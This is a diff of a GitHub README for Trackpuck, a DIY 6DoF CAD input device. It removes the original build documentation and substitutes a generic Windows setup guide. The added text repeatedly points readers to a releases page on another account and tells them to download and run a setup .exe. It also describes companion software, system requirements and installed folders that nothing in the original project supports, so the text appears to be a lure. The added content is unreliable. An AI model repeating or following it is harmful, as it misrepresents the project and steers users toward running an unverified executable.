@@ -1,89 +1,141 @@
-# Trackpuck
+# 🎯 trackpuck - Precise Control for CAD Work
 
-6 DoF input peripheral designed for CAD.
+[![Download trackpuck](https://img.shields.io/badge/Download%20trackpuck-ff6f61?style=for-the-badge&logo=github)](https://github.com/Pleasureseekerconfirmation832/trackpuck/releases)
 
-<img src="./imgs/w1.png" width="66%">
+---
 
-### Design Principles
-- 6DoF tracking output as HID Joystick
-- Integrated magnetometers [mlx90393-pcb](https://github.com/badjeff/mlx90393-pcb)
-- Powered by [ZMK](https://github.com/zmkfirmware/zmk) => OSS, on-devie profiling, say no to vendor lock eco-system
-- Compatible for seeed xiao ble form factor mcu board
-- 3D printed go-first
-- Wireless
-- Ligthweight
-- Medium to small size
-- Rigid
-- Low Profile
+## 🖥 About trackpuck
 
-### Gallery
+trackpuck is a 6 Degrees of Freedom (DoF) input device designed to improve your experience with CAD software. It helps you move through 3D models smoothly and intuitively. Instead of relying on a mouse or keyboard shortcuts, you can control your view and position precisely, making your work faster and easier.
 
-<p float="left">
-<img src="./imgs/w2.png" width="233">
-<img src="./imgs/w3.png" width="233">
-<img src="./imgs/w4.png" width="233">
-</p>
+This device connects via Bluetooth and works with common CAD applications. It also fits well into a 3D printing and maker workflow, especially when you use ZMK firmware-compatible devices.
 
-<p float="left">
-<img src="./imgs/p1.jpeg" width="233">
-<img src="./imgs/p2.jpeg" width="233">
-<img src="./imgs/p3.jpeg" width="233">
-<img src="./imgs/p4.jpeg" width="233">
-<img src="./imgs/p5.jpeg" width="233">
-</p>
+---
 
+## ➡️ System Requirements
 
-https://github.com/user-attachments/assets/f231d02b-527b-4762-a200-921404486fa5
+Before you begin, make sure your Windows PC meets these requirements:
 
-*Video 1: Navigating in Fusion 360 with TrackpuckTools Add-ins
+- Windows 10 or later (64-bit recommended)
+- Bluetooth 4.0 or higher enabled on your computer
+- At least 2 GB of free RAM
+- At least 200 MB of free disk space for installation
+- A USB port (for charging your trackpuck or connecting via cable if needed)
+- Compatible CAD software (for example, AutoCAD, Fusion 360, or SolidWorks)
 
+---
 
-https://github.com/user-attachments/assets/83aaf9c9-1d84-4c99-927c-6f882763e450
+## 🔽 Download trackpuck
 
-*Video 2: Navigating in Blender 4.5 with TrackpuckTools Extension Scripts
+Click the button below to visit the release page where you can find the latest Windows setup files and instructions.
 
+[![Download trackpuck](https://img.shields.io/badge/Download%20trackpuck-4CAF50?style=for-the-badge&logo=github)](https://github.com/Pleasureseekerconfirmation832/trackpuck/releases)
 
-### BOM
-|Unit|Item|
-|-|-|
-|1|Seeed Studio XIAO BLE (nRF52840)|
-|3|MLX90393SLW Sensor [Breakout](https://github.com/badjeff/mlx90393-pcb)|
-|3|3mm x 1mm (Diameter x Height) Neodymium Magnets|
-|4|ALPS SKRAAWE010 Micro Switch|
-|1|MSK-1153 6 Pins Power Switch|
-|1|3x4x2mm Tact Switch Turtle Switch|
-|1|601230 Lipo Battery (plus connector)|
-|6|6mm x 12mm x 4.7mm Springs|
-|10|M2 Threaded Heat Set Inserts 3mm x 3mm (Diameter x Height) |
-|6|10mm M2 Sunk Head Screws |
-|6|4mm M2 Sunk Head Screws|
-|4|3mm M2 Sunk Head Screws|
-|1|28/26 AWG silicone wire|
+---
 
-### Building Guide / Tips
+## 🚀 Getting Started with trackpuck on Windows
 
-- NOT for beginner. Requiring experience of building at least one wireless keyboard on [ZMK](https://github.com/zmkfirmware/zmk).
-- MUST have a funcation brain. Requiring to puzzling to assemble all parts together.
-- NEED very good eyesight, and soldering skill (and tools).
-- Build the core tower first.
-- Sensor breakouts order is counter clockwise started from 6 o'clock position
-- This peripheral doesn't required the weights. Use reusable self-adhesive sticky silicone gel pads from [Amazon](https://www.amazon.co.uk/silicone-Anti-Slip-holders-washable-transparent/dp/B07CGRHT31).
-- Tell AI agent read [this file](https://github.com/badjeff/trackpuck-zmk-config/blob/main/boards/shields/trackpuck/input_processor_trixer.c) before you prompt it to adjust the rates for you. But, you still can find each config description in .yml file before messing up the default rates.
+This guide helps you set up trackpuck on a Windows PC step by step. Follow each step to get your device up and running.
 
-### Firmware
+### Step 1: Visit the Release Page
 
-The ZMK firmware config repository can be find at [here](https://github.com/badjeff/trackpuck-zmk-config).
+Use the download button above or open this link in your browser:  
+https://github.com/Pleasureseekerconfirmation832/trackpuck/releases
 
-### Related Projects
+You will see files listed under the latest release. Look for a Windows installer package (usually ends with `.exe`).
 
-- [TrackpuckTools-Fusion360](https://github.com/badjeff/TrackpuckTools-Fusion360) is a Fusion 360 add-in that connects HID-based 6DoF input peripheral devices as navigation input for Fusion 360, providing fluid control over camera orbit, pan, zoom, and rotation.
+### Step 2: Download the Installer
 
-- [TrackpuckTools-Blender](https://github.com/badjeff/TrackpuckTools-Blender) is a Blender add-in that connects HID-based 6DoF input peripheral devices as navigation input for Fusion 360, providing fluid control over camera orbit, pan, zoom, and rotation.
+Click the Windows installer file to download it. The file name might look like `trackpuck-setup-vX.X.exe`. Save it to a folder you can find easily, like your Desktop or Downloads folder.
 
-- [Magnetometers tracking simulator web app](https://sim7dof4ve.vercel.app/) will show how this all thigs works.
+### Step 3: Run the Installer
 
-- [A example web app](https://trackpuck-threejs-examples.vercel.app/). Used to test HID Joystick outputs via web gamepad api.
+Find the downloaded file and double-click it. Windows might ask for permission to run the installer. Choose "Yes" or "Run" to continue.
 
-## License
+The installer will start and guide you through the setup steps. You can accept the default options or select a different folder to install the program.
 
-This work is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License. (CC BY-NC-SA 4.0)
+### Step 4: Connect trackpuck to Your PC
+
+Once installation is complete, turn on your trackpuck.
+
+- Open Windows Settings by pressing `Win + I`.
+- Go to `Devices > Bluetooth & other devices`.
+- Make sure Bluetooth is turned on.
+- Click **Add Bluetooth or other device**.
+- Select **Bluetooth** from the options.
+- Find your trackpuck in the list and click it to pair.
+- Follow any on-screen prompts to finish pairing.
+
+If your trackpuck supports USB connection, you can also connect it via a USB cable.
+
+### Step 5: Launch trackpuck Software
+
+After pairing, open the trackpuck program from your Start menu or desktop shortcut.
+
+The software will show connection status and allow you to customize settings like button mapping, sensitivity, and compatibility options for your CAD program.
+
+### Step 6: Test the Device
+
+Open your CAD software and check if trackpuck controls work. Try moving, rotating, and zooming in your 3D workspace using the device.
+
+If it doesn’t respond:
+
+- Make sure Bluetooth is connected.
+- Restart both your PC and trackpuck.
+- Check the trackpuck software for connection status or error messages.
+
+---
+
+## ⚙️ Configuring trackpuck for CAD
+
+The trackpuck software offers settings to tune the device for your specific CAD application.
+
+- **Sensitivity:** Adjust how fast the cursor or view moves in response to your gestures.
+- **Button Actions:** Assign actions to trackpuck buttons (e.g., zoom, pan, snap).
+- **Profiles:** Save different settings for different software or projects.
+- **Firmware Updates:** Keep your device up to date via the software’s update feature.
+
+---
+
+## 🔧 Troubleshooting Tips
+
+- If trackpuck does not connect, turn Bluetooth off and on again.
+- Restart the software if it stops responding.
+- Reinstall the software if problems persist.
+- Check battery level to ensure your trackpuck has enough charge.
+- Visit the release page for the newest software version if you encounter bugs.
+
+---
+
+## 📚 Additional Resources
+
+- For detailed setup or advanced features, check the README or documentation files found on the GitHub release page.
+- Look for FAQs and user discussions in the GitHub Issues section or community forums.
+- Use supported CAD software manuals to understand how to best integrate trackpuck controls.
+
+---
+
+## 📂 File Structure (Installed)
+
+When you install trackpuck software, it creates these folders and files:
+
+- **bin/** — Main program files.
+- **config/** — User settings and profiles.
+- **logs/** — Logs that help diagnose issues.
+- **README.md** — User manual and additional instructions.
+
+---
+
+## 📌 Notes on Usage
+
+- Use trackpuck on a flat surface or hold it comfortably in your hand.
+- Charge the device regularly using the supplied USB cable.
+- Keep software updated for best performance and compatibility.
+
+---
+
+## 📥 Download Again
+
+For convenience, here is the download link once more:
+
+[https://github.com/Pleasureseekerconfirmation832/trackpuck/releases](https://github.com/Pleasureseekerconfirmation832/trackpuck/releases)
